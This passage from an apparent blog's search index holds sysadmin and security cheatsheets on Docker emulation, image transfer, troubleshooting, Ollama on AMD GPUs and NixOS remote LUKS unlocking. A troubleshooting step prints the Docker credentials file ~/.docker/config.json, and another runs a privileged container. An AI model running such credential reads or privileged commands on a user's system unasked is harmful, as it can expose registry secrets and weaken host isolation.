image-analysis/ Best Practices Always work in isolated environments Document all findings and modifications Use proper version control for modified images Implement proper secret management Follow the principle of least privilege Clean up thoroughly after testing ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/dockerimagesecurityanalysis\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/howtoemulatedifferentarchitecturesindocker\/": {
        "title": "How to Emulate Different Architectures in Docker",
        "tags": ["docker","containers","pentesting","security","devops","containerization","redteam",],
        "content": "Introduction When conducting security assessments or penetration tests involving containers, you\u0026rsquo;ll often encounter images built for different CPU architectures. For example, you might need to analyze an ARM64 container on your x86_64 laptop, or test an old x86 container on modern ARM-based hardware. This guide covers various methods to handle cross-architecture container analysis.\nUnderstanding Architecture Emulation in Docker Docker uses QEMU under the hood to enable cross-architecture support. QEMU is a generic machine emulator and virtualizer that allows running binaries built for one CPU architecture on a different one.\nCommon Architecture Combinations ARM64 (aarch64) on x86_64 x86_64 on ARM64 (e.g., M1/M2 Macs) 32-bit ARM on 64-bit systems RISC-V on x86_64 or ARM64 Method 1: Docker\u0026rsquo;s Built-in Emulation The most straightforward approach uses Docker\u0026rsquo;s built-in QEMU support:\ndocker run --privileged --rm tonistiigi/binfmt --install all docker run --rm tonistiigi/binfmt --info docker run --platform linux/arm64 -it ubuntu:latest Security Considerations Running containers with \u0026ndash;privileged for binfmt installation creates security risks Emulation may hide certain architecture-specific vulnerabilities Performance overhead can impact security testing tools, it can get SLOOOOOOOWWWWWWWWWW Method 2: Using Virtual Machines When emulation isn\u0026rsquo;t sufficient, especially for complex security testing:\nQEMU-based VM Approach sudo apt install qemu-system-arm qemu-efi-aarch64 wget https://cdimage.ubuntu.com/ubuntu-server/jammy/daily-live/current/jammy-live-server-arm64.iso qemu-system-aarch64 -m 4096 -cpu cortex-a72 -M virt -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd Method 3: Building Multi-Architecture Images For testing purposes, you can build images that support multiple architectures.\n+Note+: However this is not a great option as you should be testing the container as is, not modifying it to fit your needs. docker buildx create --name mybuilder --use docker buildx build --platform linux/amd64,linux/arm64,linux/arm/v7 -t myimage:latest . Example Dockerfile for Multi-arch Support FROM --platform=$TARGETPLATFORM ubuntu:latest ARG TARGETPLATFORM ARG BUILDPLATFORM RUN echo \u0026#34;I\u0026#39;m building on $BUILDPLATFORM for $TARGETPLATFORM\u0026#34; Advanced Testing Scenarios Analyzing Architecture-Specific Vulnerabilities docker run --platform linux/arm64 -it ubuntu:latest file /bin/bash docker run --platform linux/arm64 -it ubuntu:latest strace /bin/ls Performance Impact Analysis time docker run --platform linux/amd64 alpine:latest sha256sum /bin/busybox time docker run --platform linux/arm64 alpine:latest sha256sum /bin/busybox Security Testing Tips Always verify architecture-specific behavior, just because it does x on arm doesn\u0026rsquo;t mean it will do x on amd. Consider architecture-specific exploit variations +ALWAYS+: Use checksums to verify binary integrity across architectures Troubleshooting Common Issues \u0026ldquo;Exec Format Error\u0026rdquo; This usually means emulation isn\u0026rsquo;t properly configured:\ndocker run --privileged --rm tonistiigi/binfmt --install all Performance Issues Use native architecture when possible Consider hardware acceleration options Monitor resource usage during testing ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/howtoemulatedifferentarchitecturesindocker\/"
    },
    
    "http:\/\/localhost:1313\/tags\/optimization\/": {
        "title": "Optimization",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/optimization\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pentesting\/": {
        "title": "Pentesting",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pentesting\/"
    },
    
    "http:\/\/localhost:1313\/tags\/redteam\/": {
        "title": "Redteam",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/redteam\/"
    },
    
    "http:\/\/localhost:1313\/tags\/security\/": {
        "title": "Security",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/security\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/transferringdockerimagesviascp\/": {
        "title": "Transferring Docker Images via SCP",
        "tags": ["docker","containers","devops","containerization",],
        "content": "Transferring Docker Images Between Hosts When working with Docker containers, there are situations where you need to transfer images between different hosts. This might be necessary when you have limited internet connectivity, are working with private registries, or need to move images to an isolated environment. This guide shows how to efficiently transfer Docker images between hosts using SCP and alternative methods.\nWhy Transfer Docker Images Locally? Offline capabilities\nHaving Docker images available locally means you can work without needing continuous network connectivity. This is especially valuable when working in environments with restricted or unreliable connections. No dependency on external infrastructure\nWorking with local copies eliminates reliance on external infrastructure that may have maintenance windows, performance constraints, or access limitations. Bandwidth efficiency\nTransferring images directly between hosts can be more efficient than pulling from registries, especially with large images or when working with limited bandwidth. Basic Transfer Process 1. Image Extraction (Source Machine) # List available images first docker images # Save the target image docker save -o target_image.tar image_name:tag # Optional: Calculate checksum for integrity verification sha256sum target_image.tar \u0026gt; target_image.tar.sha256 2. Secure Transfer Using SCP From host with images:\n# Transfer both image and checksum scp target_image.tar* username@destination-host:/path/to/workspace/ Or from destination host:\n# Transfer both image and checksum scp username@source-host:/path/to/images/target_image.tar* . 3. Loading the Image (Destination Machine) # Verify checksum first sha256sum -c target_image.tar.sha256 # Load the image docker load -i target_image.tar # Verify image loaded correctly docker images 4. Run the image # Basic run command docker run --name test-container target_image:tag # For different architectures (e.g., ARM64) docker run --platform linux/arm64 --name test-container target_image:tag Alternative Transfer Methods Secure Registry Transfer Useful for multiple images or repeated transfers:\n# Setup temporary private registry with TLS docker run -d \\ --name private-registry \\ -v \u0026#34;$(pwd)\u0026#34;/certs:/certs \\ -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt \\ -e REGISTRY_HTTP_TLS_KEY=/certs/domain.key \\ -p 5000:5000 \\ registry:2 Container Export Method Useful when you need to capture the state of a running container:\n# Run container and make changes docker run -it --name test-container image_name:tag /bin/bash # Export the container docker export test-container \u0026gt; container-snapshot.tar Cleanup Procedures After successfully transferring and verifying your images, it\u0026rsquo;s good practice to clean up:\n# Remove containers docker rm -f test-container # Remove temporary files rm target_image.tar* This method of transferring Docker images provides a reliable way to move containers between hosts while maintaining image integrity. Remember to always verify checksums after transfer and clean up temporary files to maintain system hygiene.\n", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/transferringdockerimagesviascp\/"
    },
    
    "http:\/\/localhost:1313\/tags\/troubleshooting\/": {
        "title": "Troubleshooting",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/troubleshooting\/"
    },
    
    "http:\/\/localhost:1313\/tags\/amd\/": {
        "title": "Amd",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/amd\/"
    },
    
    "http:\/\/localhost:1313\/cheatsheets\/troubleshootingdockerchecklist\/": {
        "title": "Docker Troubleshooting Guide: Comprehensive Solutions for Common Container Issues (2025)",
        "tags": ["docker","containers","devops","troubleshooting","debugging","containerization","sre",],
        "content": "This is a checklist for troubleshooting Docker issues. It is not a comprehensive guide, it is mainly for my own reference but is useful for other.\nDocker Troubleshooting Checklist Container Issues Container Restarting Loop Check container status and logs\nCheck status: docker ps -a View logs: docker logs \u0026lt;container_id\u0026gt; Follow logs: docker logs -f \u0026lt;container_id\u0026gt; Last N lines: docker logs --tail=100 \u0026lt;container_id\u0026gt; Common causes and solutions\nCheck if entrypoint/CMD is correct Verify environment variables are set properly Check for application crashes in logs Verify container has enough resources Memory: docker stats Disk space: df -h Container Won\u0026rsquo;t Start Basic checks\nVerify image exists: docker images Check port conflicts: docker ps Check local port usage: netstat -antp | grep -i list Inspect container: docker inspect \u0026lt;container_id\u0026gt; Check container configuration Volume mounts Verify host paths exist: ls -la \u0026lt;host_path\u0026gt; Check permissions: ls -la \u0026lt;host_path\u0026gt; | grep $(whoami) Inspect volume mounts: docker inspect \u0026lt;container_id\u0026gt; | grep -A 10 Mounts List volumes: docker volume ls Port mappings Check container port mappings: docker port \u0026lt;container_id\u0026gt; Verify host port availability: ss -tulpn Review docker-compose ports section Check for port conflicts in other containers Network settings List container networks: docker network ls Check container network mode: docker inspect \u0026lt;container_id\u0026gt; | grep -i network Verify DNS resolution: docker exec \u0026lt;container_id\u0026gt; cat /etc/resolv.conf Check network driver: docker network inspect \u0026lt;network_name\u0026gt; | grep -i driver Test internal connectivity: docker exec \u0026lt;container_id\u0026gt; ping \u0026lt;other_container\u0026gt; Build Issues Image Build Failures Common checks\nVerify Dockerfile syntax Check build context Run with verbose output: docker build --progress=plain . Clear build cache: docker builder prune Network-related\nCheck network connectivity Verify proxy settings if applicable Test registry access Network Issues Connectivity Problems Basic diagnostics\nList networks: docker network ls Inspect network: docker network inspect \u0026lt;network_name\u0026gt; Check DNS resolution inside container: docker exec \u0026lt;container_id\u0026gt; ping \u0026lt;hostname\u0026gt; Port Mapping Issues Verification steps\nCheck port bindings: docker port \u0026lt;container_id\u0026gt; Verify host ports are available: netstat -tulpn Test connectivity: curl localhost:\u0026lt;port\u0026gt; Resource Issues Memory Problems Monitoring and diagnostics\nCheck memory usage: docker stats Review container limits: docker inspect \u0026lt;container_id\u0026gt; | grep -i memory Check system memory: free -h Disk Space Issues Cleanup steps\nRemove unused containers: docker container prune Remove unused images: docker image prune Remove unused volumes: docker volume prune Remove all unused resources: docker system prune Check disk usage: docker system df Logging and Debugging Advanced Logging Commands\nView daemon logs: journalctl -u docker.service Enable debug mode: dockerd -D Check container events: docker events Container Debugging Interactive debugging\nEnter running container: docker exec -it \u0026lt;container_id/name\u0026gt; /bin/sh Inspect processes: docker top \u0026lt;container_id\u0026gt; View container details: docker inspect \u0026lt;container_id\u0026gt; Compose Issues Docker Compose Troubleshooting Common checks\nValidate compose file: docker-compose config Check service dependencies: docker-compose ps Force recreation: docker-compose up --force-recreate Check compose logs: docker-compose logs -f \u0026lt;service_name\u0026gt; Verify environment file: cat .env Permission Issues Common Permission Problems File system permissions\nCheck Docker socket permissions: ls -la /var/run/docker.sock Verify user is in docker group: groups ${USER} Fix ownership issues: chown -R \u0026lt;user\u0026gt;:\u0026lt;group\u0026gt; \u0026lt;path\u0026gt; SELinux contexts: ls -lZ Storage Driver Issues Troubleshooting Steps Driver checks\nCheck current storage driver: docker info | grep \u0026quot;Storage Driver\u0026quot; Verify supported drivers: docker info | grep -A 8 \u0026quot;Storage Driver\u0026quot; Monitor storage driver errors: journalctl -fu docker.service | grep storage Registry Issues Authentication and Access Common problems\nTest registry login: docker login \u0026lt;registry-url\u0026gt; Check credentials file: cat ~/.docker/config.json Verify registry certificates Test registry connectivity: curl -v https://\u0026lt;registry-url\u0026gt;/v2/ Container Health Checks Health Monitoring Health status\nView health status: docker inspect --format='{{.State.Health.Status}}' \u0026lt;container_id\u0026gt; Check health check config: docker inspect --format='{{.Config.Healthcheck}}' \u0026lt;container_id\u0026gt; Monitor health check logs: docker inspect --format='{{range .State.Health.Log}}{{.Output}}{{end}}' \u0026lt;container_id\u0026gt; Performance Issues Container Performance Monitoring tools\nCheck CPU usage: docker stats --format \u0026quot;table {{.Container}}\\t{{.CPUPerc}}\\t{{.MemUsage}}\u0026quot; Monitor I/O operations: docker stats --format \u0026quot;table {{.Container}}\\t{{.BlockIO}}\u0026quot; Check process list: docker top \u0026lt;container_id\u0026gt; aux Resource constraints: docker inspect \u0026lt;container_id\u0026gt; | grep -i -A 10 \u0026quot;hostconfig\u0026quot; Networking Deep Dive Advanced Network Troubleshooting Debug tools\nCheck iptables rules: iptables -L -n Inspect bridge network: ip addr show docker0 Track network packets: tcpdump -i docker0 Check network namespaces: ip netns list Common Gotchas Known Issues Time and Timezone Issues\nTime synchronization between host and containers Check host time: date Check container time: docker exec \u0026lt;container_id\u0026gt; date Verify timezone file mount: docker inspect \u0026lt;container_id\u0026gt; | grep /usr/share/zoneinfo Add timezone environment: -e TZ=UTC File System Issues\nCase sensitivity in volume mounts Linux is case-sensitive, Windows/Mac aren\u0026rsquo;t Check actual file names: ls -la Verify mount points: docker inspect \u0026lt;container_id\u0026gt; | grep -A 10 Mounts Test file access: docker exec \u0026lt;container_id\u0026gt; ls -la /path/to/mount Encoding and Locale Issues\nUTF-8 and character encoding Check container locale: docker exec \u0026lt;container_id\u0026gt; locale Verify file encoding: file -i \u0026lt;filename\u0026gt; Set container locale: -e LANG=C.UTF-8 Check log file encoding: less \u0026lt;logfile\u0026gt; (look for strange characters) Process Management\nZombie process handling Check for zombies: docker top \u0026lt;container_id\u0026gt; | grep -i defunct Verify init process: docker inspect \u0026lt;container_id\u0026gt; | grep -i pid Use init system: --init flag when running container Monitor process states: docker exec \u0026lt;container_id\u0026gt; ps aux Daemon Management\nDocker daemon configuration Check auto-start: systemctl is-enabled docker Verify daemon config: cat /etc/docker/daemon.json Monitor daemon status: systemctl status docker Check startup options: ps aux | grep dockerd Container Communication Inter-Container Networking Basic Connectivity\nCheck if containers are on same network List networks: docker network ls Inspect network: docker network inspect \u0026lt;network_name\u0026gt; List connected containers: docker network inspect \u0026lt;network_name\u0026gt; | grep -A 5 \u0026quot;Containers\u0026quot; DNS Resolution\nVerify DNS resolution between containers Test DNS lookup: docker exec \u0026lt;container_id\u0026gt; nslookup \u0026lt;other_container_name\u0026gt; Check DNS settings: docker exec \u0026lt;container_id\u0026gt; cat /etc/resolv.conf Verify /etc/hosts: docker exec \u0026lt;container_id\u0026gt; cat /etc/hosts Test DNS server: docker exec \u0026lt;container_id\u0026gt; dig \u0026lt;other_container_name\u0026gt; Network Debugging\nTroubleshoot connectivity issues Ping test: docker exec \u0026lt;container_id\u0026gt; ping \u0026lt;other_container_name\u0026gt; TCP connection test: docker exec \u0026lt;container_id\u0026gt; nc -vz \u0026lt;other_container_name\u0026gt; \u0026lt;port\u0026gt; Trace route: docker exec \u0026lt;container_id\u0026gt; traceroute \u0026lt;other_container_name\u0026gt; Check network isolation: docker network inspect \u0026lt;network_name\u0026gt; | grep -i \u0026quot;internal\u0026quot; Common Network Issues\nCheck for common problems Verify container names match DNS entries Ensure ports are exposed between containers Check network driver compatibility Verify no IP conflicts: docker network inspect \u0026lt;network_name\u0026gt; | grep -i \u0026quot;ipv4\u0026quot; Advanced Network Diagnostics\nDeep dive network troubleshooting Capture network traffic: docker exec \u0026lt;container_id\u0026gt; tcpdump -i eth0 Check iptables rules: iptables -L -n -v | grep \u0026lt;container_ip\u0026gt; Verify network policies: docker network inspect \u0026lt;network_name\u0026gt; | grep -i \u0026quot;policy\u0026quot; Monitor network metrics: docker stats --format \u0026quot;table {{.Container}}\\t{{.NetIO}}\u0026quot; Docker Compose Networking\nCompose-specific network issues Check service dependencies: docker-compose ps Verify network definitions in compose file Test service discovery: docker-compose exec \u0026lt;service_name\u0026gt; ping \u0026lt;other_service\u0026gt; Check network aliases: docker-compose exec \u0026lt;service_name\u0026gt; nslookup \u0026lt;service_alias\u0026gt; Emergency Recovery Recovery Steps When everything fails\nBackup container data: docker cp \u0026lt;container_id\u0026gt;:/path/to/data ./backup Save container state: docker commit \u0026lt;container_id\u0026gt; backup-image Export container filesystem: docker export \u0026lt;container_id\u0026gt; \u0026gt; container.tar Restart Docker daemon: systemctl restart docker Check Docker daemon status: systemctl status docker Environment Specific Different OS Considerations Platform specific\nWindows path formats in volume mounts MacOS file sharing settings Linux cgroup configuration Container user mapping issues ", 
        "url": "http:\/\/localhost:1313\/cheatsheets\/troubleshootingdockerchecklist\/"
    },
    
    "http:\/\/localhost:1313\/tags\/gpu\/": {
        "title": "Gpu",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/gpu\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/homelab-runningollamalocally\/": {
        "title": "How to Run Local LLMs with Ollama on AMD GPU (Complete Guide)",
        "tags": ["homelab","ollama","llm","amd","rocm","gpu","local-llm",],
        "content": "This is mainly being put here for reference for me. I will writeup nix instructions when I finally migrate my main system to nix, but at the moment this is on arch \u0026amp; I wanted to document the process for myself.\nI am using an AMD gpu so this may differ for you:\nInstall AMD GPU backend packages: sudo pacman -S rocminfo rocm-opencl-sdk rocm-hip-sdk rocm-ml-sdk Install ollama with AMD GPU support. yay -S ollama-rocm Start Ollama: ollama serve Run open-webui via docker: services: open-webui: build: context: . dockerfile: Dockerfile image: ghcr.io/open-webui/open-webui:${WEBUI_DOCKER_TAG-main} container_name: open-webui volumes: - ./open-webui:/app/backend/data network_mode: host environment: - \u0026#39;OLLAMA_BASE_URL=http://127.0.0.1:11434\u0026#39; restart: unless-stopped volumes: open-webui: {} Docker compose up -d Access Open WebUI: http://localhost:8080 Pull A Model Down: System Requirements Minimum 8GB RAM (16GB+ recommended for larger models) GPU with at least 6GB VRAM for running medium-sized models Storage space depending on models (each model can be 3-8GB+) Common Model Commands # List all installed models ollama list # Remove a model ollama rm model-name # Get model information ollama show model-name # Run a model in CLI ollama run model-name Troubleshooting If GPU is not detected, ensure ROCm drivers are properly installed and configured Check logs with journalctl -u ollama Verify Ollama service status with systemctl status ollama Common ports used: 11434 (Ollama API), 8080 (Open WebUI) Additional Resources Official Ollama documentation: https://github.com/ollama/ollama/tree/main/docs Model library: https://ollama.com/search GitHub repository: https://github.com/ollama/ollama Introduction This guide demonstrates how to run Large Language Models (LLMs) locally using Ollama with AMD GPU acceleration. While many guides focus on NVIDIA GPUs, this tutorial specifically covers AMD GPU setup using ROCm on Arch Linux. Running LLMs locally provides better privacy, reduced latency, and no API costs.\nPerformance Optimization AMD GPU-Specific Settings Ensure ROCm is properly detecting your GPU: rocminfo Monitor GPU usage: rocm-smi Check GPU temperature: sensors Model Optimization Use quantized models (e.g., q4_0, q4_1) for better performance Adjust context length based on your VRAM Consider model size vs. performance tradeoffs ", 
        "url": "http:\/\/localhost:1313\/homelab\/homelab-runningollamalocally\/"
    },
    
    "http:\/\/localhost:1313\/tags\/llm\/": {
        "title": "Llm",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/llm\/"
    },
    
    "http:\/\/localhost:1313\/tags\/local-llm\/": {
        "title": "Local-Llm",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/local-llm\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ollama\/": {
        "title": "Ollama",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ollama\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rocm\/": {
        "title": "Rocm",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rocm\/"
    },
    
    "http:\/\/localhost:1313\/tags\/sre\/": {
        "title": "Sre",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/sre\/"
    },
    
    "http:\/\/localhost:1313\/homelab\/20250280118-nixos-homelab-4\/": {
        "title": "Rebuilding My Homelab In NixOS (Part 4) Decrypting boot early with initrd-ssh",
        "tags": ["docker","nixos","homelab","system","configuration",],
        "content": "This is part 4 of my series demonstrating my rebuild of my homelab in NixOS.\nInitial creation of the NixOSVM on Proxmox Part 1 . Enabling SSH access on NixOS Part 2 . Mounting a secondary drive on NixOS Part 3 . Decrypting boot early with initrd-ssh Part 4 . (This Part) Installing Docker on NixOS Part 5 Remote LUKS Unlocking for NixOS Homelab Systems The Challenge with Encrypted Homelab Systems: Running an encrypted NixOS system (or any encrypted Linux) in a homelab environment presents a specific challenge: entering the LUKS passphrase at boot time typically requires either physical access to the machine or access to a management console like Proxmox.\nWhile this might seem fine if you think \u0026ldquo;my homelab isn\u0026rsquo;t managed remotely,\u0026rdquo; it creates limitations. What if you\u0026rsquo;re away from home when your system needs a reboot? What if you want more flexibility in how you manage your systems?\nThe Solution: SSH Access During Early Boot: Fortunately, NixOS provides an elegant solution to this problem. You can configure your system to allow SSH access during the early boot process (initrd) before the root filesystem is mounted. This allows you to remotely enter your LUKS passphrase from anywhere.\n\u0026ldquo;But how can I do that if there\u0026rsquo;s no way into my network externally?\u0026rdquo;\nDon\u0026rsquo;t worry - later in this series, we\u0026rsquo;ll be adding Tailscale and configuring another node as a router, enabling secure remote access to your systems for entering passwords.\nBy the end of this guide, you\u0026rsquo;ll have a NixOS system that you can unlock remotely via SSH, eliminating the need for physical access or management console access during boot.\nWhat is initrd? Initrd is basically a mini operating system that loads before your main system starts. It lives in your computer\u0026rsquo;s memory and contains the essential tools needed to unlock your encrypted drive. Think of it as a starter engine that helps get your main engine running. By allowing SSH access during this early boot phase, you can remotely type in your password to unlock your encrypted system.\nSecurity Considerations: Before we start, it\u0026rsquo;s important to understand the security implications:\nThe SSH host keys for early boot must be stored in plain text on an unencrypted partition. Theoretically, this means an attacker with physical access could potentially extract these keys and perform a man-in-the-middle attack. For truly sensitive systems, you should physically verify hardware integrity or use a TPM. That said, for this homelab environment where the main goal is convenience while maintaining basic security, this approach is quite useful.\nPrerequisites: Before beginning, we will need a couple of things.\nA working NixOS installation with an encrypted root filesystem. SSH already configured for normal system access. Your network interface name (can be found using ip a or ifconfig). Root access to the system. +Note+: Luckily if you have been following the steps in this series so far you will have these things already. Step 1: Configure Early Boot Networking: First, we need to enable networking in the initial ramdisk (initrd), to do this we need the following information:\nThe networking interface of the VM. To include the required kernel modules for the network card. Discovering the network interface we are using: Luckily this information is easy to obtain we can run the below command. ip link show From this we can see the device is enp6s18 Determining Required Network Modules for NixOS Boot: To enable networking during early boot, we need to identify which kernel modules are needed for our network interface to function. For Proxmox VMs using VirtIO networking (like ours), we can find these with:\nlsmod | grep net Looking at the output:\n[martin@nixos:~]$ lsmod | grep net nfnetlink 20480 3 nft_compat,nf_tables virtio_net 90112 0 net_failover 24576 1 virtio_net failover 12288 1 net_failover virtio 16384 7 virtio_rng,virtio_console,virtio_balloon,virtio_scsi,virtio_gpu,virtio_pci,virtio_net virtio_ring 57344 7 virtio_rng,virtio_console,virtio_balloon,virtio_scsi,virtio_gpu,virtio_pci,virtio_net From this, we can identify the key modules our VirtIO network interface depends on. We\u0026rsquo;ll need to include these in our NixOS configuration: (do not do this yet, we have a little more work to do.)\nboot.initrd.availableKernelModules = [ \u0026#34;virtio_net\u0026#34; # Primary network driver \u0026#34;virtio\u0026#34; # Base virtualization support \u0026#34;virtio_pci\u0026#34; # PCI bus support for virtio \u0026#34;net_failover\u0026#34; # Network failover capability \u0026#34;failover\u0026#34; # Base failover functionality ]; These modules ensure your network interface will be properly initialized during the early boot process, allowing SSH access before the encrypted drive is mounted.\nUnderstanding Module Dependencies (Optional): For those interested in how we determined these modules, let\u0026rsquo;s break down the lsmod output:\nModule name (first column) Size in bytes (second column) Used by count (third column) - how many other modules or processes are using this module Used by list (fourth column) - which modules are depending on this module The dependency tree looks like this:\nModule Dependency Tree: virtio_net \u0026lt;-----+ Primary network driver | | v | net_failover | First-level dependencies | | v | failover | Second-level dependencies | virtio ----------+ Virtualization base | +----\u0026gt; virtio_pci Required for PCI bus access | +----\u0026gt; virtio_ring Low-level support (and other virtio modules) Reading this dependency chain:\nPrimary Network Module: virtio_net - This is your actual network driver\nThe \u0026ldquo;0\u0026rdquo; in the second column means no other modules depend on it But it appears in other modules\u0026rsquo; dependency lists First-Level Dependencies:\nnet_failover depends on virtio_net (indicated by the \u0026ldquo;1\u0026rdquo; and \u0026ldquo;virtio_net\u0026rdquo; in its row) virtio has 7 dependencies, including virtio_net Second-Level Dependencies:\nfailover depends on net_failover virtio_pci is needed by the virtualization stack virtio_ring provides low-level support for all virtio modules Adding The Modules To Our hardware-configuration.nix: As we now have the name of our interface as well as the list of modules we can now modify our hardware-configuration.nix to include this information, so lets do it.\n+Before we make any changes backup+ hardware-configuration.nix\nsudo cp /etc/nixos/hardware-configuration.nix /etc/nixos/hardware-configuration.nix.bak This is just incase, we need to revert any changes etc, this will make it easier to do so. Open hardware-configuration.nix:\nsudo nano /etc/hardware-configuration.nix +Note+: Just FYI, I know we are using nano, as a vim person this pains me but we have not gotten to the installing packages part, but once we do, it will be vim motion city. When you open the file you will see the that the boot.initrd.availableKernelModules list already has some entries like the image below, as you can see it already has virtio_pci so we can remove that from our list.\nDon\u0026rsquo;t worry about the existing entries we are just going to add our additional kernel modules into this list, we are also going to split it across multiple lines so it\u0026rsquo;s a lot easier to read.\n# Make modules available if needed # Everything below sd_mod is our additions boot.initrd.availableKernelModules = [ \u0026#34;uhci_hcd\u0026#34; # USB 1.1 Host Controller Interface driver \u0026#34;ehci_pci\u0026#34; # USB 2.0 PCI-based Host Controller Interface driver \u0026#34;ahci\u0026#34; # Advanced Host Controller Interface for SATA devices \u0026#34;virtio_pci\u0026#34; # PCI bus support for virtio \u0026#34;virtio_scsi\u0026#34; # SCSI device support for virtualized environments \u0026#34;sd_mod\u0026#34; # SCSI disk driver for most storage devices \u0026#34;sr_mod\u0026#34; # SCSI CD-ROM/DVD driver \u0026#34;virtio_net\u0026#34; # Primary network driver \u0026#34;virtio\u0026#34; # Base virtualization support \u0026#34;net_failover\u0026#34; # Network failover capability \u0026#34;failover\u0026#34; # Base failover functionality ]; Once you have made these changes save the file, but do not rebuild as we have more changes to make.\nForce Loading Kernel Modules in hardware-configuration.nix: We are now going to force load some kernel modules. Again open up hardware-configuration.nix \u0026amp; you will see that the boot.initrd.kernelModules list is empty.\nWe are going to add the two entries below, again splitting it across multiple lines to make it more readable.\n# Force load the critical network modules boot.initrd.kernelModules = [ \u0026#34;virtio_net\u0026#34; # VirtIO network driver for paravirtualized environments \u0026#34;e1000\u0026#34; # Intel Gigabit Ethernet driver for emulated network interfaces ]; Why use both availableKernelModules \u0026amp; kernelModules?\navailableKernelModules: This makes the modules available to be loaded if needed. The system will only load them when it detects matching hardware. kernelModules: This forcibly loads the listed modules during the boot process, regardless of whether the hardware is detected. By including both \u0026ldquo;virtio_net\u0026rdquo; and \u0026ldquo;e1000\u0026rdquo; in the kernelModules, we ensure network connectivity in virtually any VM configuration:\nIf your VM uses VirtIO networking (most common in Proxmox for performance), the virtio_net driver will work. If your VM uses emulated Intel e1000 networking, the e1000 driver will work. This makes our configuration more robust and portable. Imagine, if you share this configuration or apply it to another VM with a different network device type, it should still work without modification.\n+Note+: This approach is especially important for remote LUKS decryption, where network access is critical and we don\u0026rsquo;t want to be locked out of our encrypted systems. Your should now have the following entries in your hardware-configuration.nix:\nConfiguring DHCP for Early Boot Networking: Now we need to configure how our network interface obtains an IP address during early boot. For remote LUKS decryption to work reliably, we want to be very specific about our network configuration:\nWe\u0026rsquo;ll disable global DHCP (which would affect all interfaces) Then enable it specifically for our known working interface, which you would have established earlier, in my case it\u0026rsquo;s ens18. This approach has several advantages:\nIt prevents potential delays from NixOS trying to configure interfaces that don\u0026rsquo;t exist. It ensures we know exactly which interface is being used for network access. It provides more predictable behavior during the critical early boot phase. It follows the principle of least privilege by only enabling what we need. The settings to alter/replace will most likely be at the bottom of your hardware-configuration.nix and look similar to the below.\nHere are the settings we need to add/replace.\n# Networking configuration networking = { # Disable global DHCP to prevent automatic configuration on all interfaces useDHCP = lib.mkDefault false; # Enable DHCP only for our specific interface that we need for early boot interfaces.enp6s18.useDHCP = lib.mkDefault true; }; First we wrap everything in the networking block. useDHCP = false This disables automatic DHCP for all interfaces, giving us precise control over which interfaces use DHCP. interfaces.ens18.useDHCP = true This explicitly enables DHCP for only our known working interface. Step 2: Generate SSH Host Key: First we need to generate a dedicated SSH host key for the initrd environment on the nixos host +IMPORTANT+: Remember this will be stored in plain text, so +don\u0026rsquo;t reuse your regular host keys!+ # Generate a new ed25519 key sudo ssh-keygen -t ed25519 -f /etc/ssh/initrd_ssh_host_ed25519_key You do not need to give this a password. Step 3: Find the UUID of your LUKS encrypted partition: For this to work we need to the UUID of the LUKS encrypted partition use the below command:\nlsblk -f +Note+: Luckily it\u0026rsquo;s prefixed with luks so it\u0026rsquo;s easy enough to spot. So from the image we can see on my host the UUID is 37b6f582-27a6-4e93-87ff-1a477dba2a77 Step 4: Set Up SSH Server in initrd: Now we have all the information we need so we can do the bulk of our configuration. First we\u0026rsquo;ll configure an SSH server to run during early boot and set up systemd services to handle LUKS decryption. This will be made in our /etc/nixos/hardware-configuration.nix file.\nBelow is what you will need to paste in:\n+Remember+: Replace the authorizedKeys with your own public key Use your LUKS UUID for the device path boot.initrd = { # Enable systemd in the initial ramdisk environment systemd = { enable = true; # Specify which programs need to be available during early boot initrdBin = with pkgs; [ cryptsetup # Tool needed for unlocking LUKS encrypted drives ]; # Configure networking using systemd\u0026#39;s network manager network = { networks = { \u0026#34;enp6s18\u0026#34; = { # Replace with your network interface name matchConfig = { Name = \u0026#34;enp6s18\u0026#34;; # Matches the network interface by name }; networkConfig = { DHCP = \u0026#34;yes\u0026#34;; # Enable DHCP to automatically get an IP address }; }; }; }; # Define the service that will handle LUKS unlocking services = { unlock-luks = { description = \u0026#34;Unlock LUKS encrypted root device\u0026#34;; # Make sure this service runs during boot wantedBy = [ \u0026#34;initrd.target\u0026#34; ]; # Wait for network to be ready before trying to unlock after = [ \u0026#34;network-online.target\u0026#34; ]; # Must unlock before trying to mount the root filesystem before = [ \u0026#34;sysroot.mount\u0026#34; ]; # Ensure necessary tools are available path = [ \u0026#34;/bin\u0026#34; ]; # Configure how the service behaves serviceConfig = { Type = \u0026#34;oneshot\u0026#34;; # Service runs once and exits RemainAfterExit = true; # Consider service active even after it exits SuccessExitStatus = [ 0 1 ]; # Both 0 and 1 are considered success }; # The actual commands to unlock the drive script = \u0026#39;\u0026#39; echo \u0026#34;Waiting for LUKS unlock...\u0026#34; # Try to unlock the encrypted drive # The || true ensures the script doesn\u0026#39;t fail if first attempt fails cryptsetup open /dev/disk/by-uuid/YOUR-UUID-HERE root --type luks || true \u0026#39;\u0026#39;; }; }; }; # Configure SSH access during early boot network = { enable = true; ssh = { enable = true; port = 2222; # Use a non-standard port for security # Only allow running the unlock service when connecting via SSH authorizedKeys = [ 